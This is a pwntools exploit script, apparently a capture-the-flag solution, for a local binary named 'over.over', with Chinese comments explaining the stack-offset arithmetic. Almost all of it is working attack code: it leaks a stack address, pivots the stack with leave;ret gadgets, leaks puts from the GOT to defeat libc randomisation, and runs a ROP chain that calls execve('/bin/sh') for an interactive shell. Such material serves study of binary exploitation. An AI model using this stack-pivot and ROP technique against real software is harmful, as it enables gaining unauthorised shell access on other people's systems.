#/usr/bin/python
from pwn import *
elf = ELF('./over.over')
libc = elf.libc
io = process('./over.over')

puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])
pop_rdi_ret = p64(0x400793)
leave_ret = p64(0x4006be)
vul_func = p64(0x400676)

payload1 = 'a'*80
io.sendafter(">",payload1)
stack_base = u64(io.recvuntil("\x7f")[-6:].ljust(8,'\0'))-0x70
success('stack base addr => 0x%x'%stack_base)

payload2 = p64(0) + pop_rdi_ret + puts_got + puts_plt + vul_func + 40*'a' + p64(stack_base) + leave_ret
io.sendafter(">",payload2)
puts_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8,'\0'))
success('puts function addr => 0x%x'%puts_addr)
libc.address = puts_addr - libc.symbols['puts']
bin_sh = next(libc.search("/bin/sh"))
success('/bin/sh addr => 0x%x'%bin_sh)
execve_addr = libc.symbols['execve']
success('execve function addr => 0x%x'%execve_addr)
pop_rdx_pop_rsi_ret = libc.address + 0x1306d9
payload3 = p64(0) + pop_rdi_ret + p64(bin_sh) + p64(pop_rdx_pop_rsi_ret) + p64(0) + p64(0) + p64(execve_addr) + 'a'*24 + p64(stack_base-0x30) + leave_ret
io.sendafter(">",payload3)
#print io.recv()
io.interactive()

#求stackbase减去0x70是因为栈上保存的是main函数的rbp，而栈帧是函数开始时rsp（现在rbp的值）决定
#在main函数中rsp已经减去了0x10，call的时候保存return地址和previous rbp又要减去0x10，所以rsp相对于main的rbp，减去了0x20
#然后在vul函数开空间再减去0x50，所以相对precious rbp就是减去0x70
#第二次栈底变化时因为rsp被劫持，栈整体向低地址移动了
#总的来说和未开启NX的题一样，都是控制esp，这里只不过用了rbp做跳板，以及将shellcode换成rop chain
